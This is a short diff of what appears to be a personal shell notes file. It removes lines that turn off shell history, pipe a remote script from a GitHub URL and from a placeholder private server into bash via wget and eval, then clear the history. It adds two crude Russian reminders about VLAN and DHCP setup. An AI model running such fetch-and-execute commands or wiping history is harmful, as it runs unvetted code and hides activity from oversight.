@@ -1,8 +1,2 @@
-unset HISTFILE
-apt-get update
-wget -qO- "https://raw.githubusercontent.com/NNCmef/mef1337/refs/heads/main/alt-debug.sh" | tr -d '\r'| bash
-"eval "$(wget -qO- "https://raw.githubusercontent.com/NNCmef/mef1337/refs/heads/main/alt-debug.sh" | tr -d '\r')""
-history -c && history -w
-
-
-eval "$(wget -qO- "http://IP_ТВОЕГО_ЛИЧНОГО_СЕРВЕРА/alt.sh")"
+не проебаться в ланами на сервере тоже делать
+неь проебаться с дшсп
